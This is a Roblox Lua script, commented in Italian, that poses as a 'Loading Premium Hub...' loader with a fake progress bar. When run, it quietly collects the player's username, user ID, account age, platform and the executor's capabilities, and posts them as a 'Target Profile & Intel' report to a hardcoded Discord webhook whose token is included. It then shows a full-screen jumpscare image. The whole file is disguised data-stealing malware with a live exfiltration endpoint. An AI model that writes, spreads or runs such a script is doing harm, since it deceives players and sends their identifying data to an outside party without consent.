local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local localPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1540769300225466468/t61SPD-DFDxsX6QjHvQg_1GmESBYTXJ3fmWiog7K514CQK-cxeV8-0dKXaAuhBbk3KKY"

-- 1. Raccolta informazioni avanzate e vulnerabilità dell'environment
local function gatherIntel()
    local info = {}
    table.insert(info, "User: " .. localPlayer.Name)
    table.insert(info, "Display: " .. localPlayer.DisplayName)
    table.insert(info, "User ID: " .. localPlayer.UserId)
    table.insert(info, "Account Age: " .. localPlayer.AccountAge .. " days")
    table.insert(info, "Platform: " .. tostring(game:GetService("UserInputService"):GetPlatform()))
    
    -- Controllo funzioni dell'executor (Vulnerabilità / Capabilità)
    local capabilities = {}
    if getgenv then table.insert(capabilities, "getgenv") end
    if syn then table.insert(capabilities, "Synapse/Custom") end
    if fluxus then table.insert(capabilities, "Fluxus") end
    if request then table.insert(capabilities, "request") end
    if makefolder then table.insert(capabilities, "FileSystem (makefolder)") end
    if delfile then table.insert(capabilities, "FileSystem (delfile)") end
    
    table.insert(info, "Executor Capabilities: " .. table.concat(capabilities, ", "))
    
    return table.concat(info, "\n")
end

-- 2. Invio dei dati al webhook
local function sendData()
    local report = gatherIntel()
    local payload = {
        ["content"] = "```yaml\n[+] Full Target Profile & Intel:\n" .. report .. "\n```"
    }
    pcall(function()
        if request then
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        else
            HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
        end
    end)
end

sendData()

-- 3. Creazione della GUI ingannevole che si trasforma in jumpscare
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "InnocentLoader"
screenGui.Parent = CoreGui
screenGui.IgnoreGuiInset = true

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "Loading Premium Hub..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.SourceSansBold
title.Parent = mainFrame

local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(0.8, 0, 0, 20)
barBackground.Position = UDim2.new(0.1, 0, 0.6, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBackground.BorderSizePixel = 0
barBackground.Parent = mainFrame

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBackground

-- Animazione finta barra di caricamento e poi Jumpscare
task.spawn(function()
    for i = 1, 100 do
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.03)
    end
    
    -- Transizione Jumpscare a schermo intero
    mainFrame:Destroy()
    
    local jumpscareFrame = Instance.new("Frame")
    jumpscareFrame.Size = UDim2.new(1, 0, 1, 0)
    jumpscareFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    jumpscareFrame.BorderSizePixel = 0
    jumpscareFrame.Parent = screenGui
    
    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    -- Inserisci qui l'ID di un'immagine spaventosa di Roblox
    image.Image = "rbxassetid://155373809" 
    image.Parent = jumpscareFrame
end)
